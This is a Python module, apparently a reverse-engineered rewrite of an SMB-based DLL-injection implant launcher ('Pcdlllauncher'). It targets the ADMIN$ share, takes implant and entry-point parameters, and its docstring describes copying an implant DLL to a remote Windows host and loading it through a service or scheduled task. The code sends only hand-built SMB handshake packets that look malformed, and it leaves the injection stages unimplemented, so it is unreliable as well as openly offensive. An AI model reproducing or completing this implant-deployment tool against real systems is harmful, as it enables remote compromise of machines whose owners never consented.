"""pcdlllauncher — PCDLLLAUNCHER DLL 注入核心逻辑。

Python 重写的 `Pcdlllauncher-2.3.1.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 DLL 注入利用流程。

参数定义来源：Pcdlllauncher-2.3.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60

ARCHITECTURE_VALUES = {
    "x86": 0,
    "x64": 1,
}

PC_BEHAVIOR_VALUES = {
    "7": 7,
    "8": 8,
}


class PcDllLauncherError(Exception):
    pass


def _parse_hex_buffer(value):
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise PcDllLauncherError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise PcDllLauncherError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smb_negotiate_request():
    command = 0x72
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x00" + struct.pack("<H", len(dialects)) + dialects
    )
    return smb


def build_session_setup_request():
    command = 0x73
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x0d" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 0)
        + struct.pack("<H", 4096) + struct.pack("<H", 0)
        + struct.pack("<I", 0) + struct.pack("<I", 0)
        + struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
    )
    return smb


def build_tree_connect_request(share_name=b"ADMIN$"):
    command = 0x75
    share = share_name + b"\x00"
    password = b"\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x04" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 1)
        + struct.pack("<H", len(password)) + struct.pack("<H", len(share))
        + struct.pack("<H", 0) + password + share
    )
    return smb


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    lp_filename=None,
    lp_entry_name="ServiceEntry",
    implant_filename=None,
    target_os_arch="x86",
    pc_behavior="8",
    verbose=False,
):
    """执行 PCDLLLAUNCHER 注入序列。

    阶段：
      1. TCP 连接到目标 SMB 端口
      2. 发送 SMB 协商请求
      3. 会话设置 (SESSION_SETUP_ANDX)
      4. 树连接 (TREE_CONNECT_ANDX) 到 ADMIN$
      5. 将 DLL 注入文件复制到目标
      6. 通过服务或计划任务加载 DLL
      7. 输出注入结果
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] LP file: {lp_filename}")
        print(f"[*] LP entry point: {lp_entry_name}")
        print(f"[*] Implant file: {implant_filename}")
        print(f"[*] Target architecture: {target_os_arch}")
        print(f"[*] PC behavior: {pc_behavior}")

    arch_value = ARCHITECTURE_VALUES.get(target_os_arch, 0)
    pc_behavior_value = PC_BEHAVIOR_VALUES.get(pc_behavior, 8)

    if verbose:
        print(f"[*] Architecture value: {arch_value}")
        print(f"[*] PC behavior value: {pc_behavior_value}")

    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise PcDllLauncherError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        negotiate = build_smb_negotiate_request()
        sock.sendall(negotiate)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] SMB 协商应答: {resp.hex()[:128] if resp else '无'}")

        if not resp or resp[4:7] != b"SMB":
            raise PcDllLauncherError("目标未返回有效的 SMB 应答")

        session_setup = build_session_setup_request()
        sock.sendall(session_setup)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 会话设置应答: {resp.hex()[:128] if resp else '无'}")

        tree_connect = build_tree_connect_request(b"ADMIN$")
        sock.sendall(tree_connect)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 树连接应答: {resp.hex()[:128] if resp else '无'}")

        if verbose:
            print(f"[*] LP 文件: {lp_filename}")
            print(f"[*] 入口点: {lp_entry_name}")
            print(f"[*] 惯例文件: {implant_filename}")
            print(f"[*] 目标架构: {target_os_arch} (0x{arch_value:02X})")
            print(f"[*] PC 行为: {pc_behavior} (0x{pc_behavior_value:02X})")
            print("[+] PCDLLLAUNCHER 探测完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    return 0
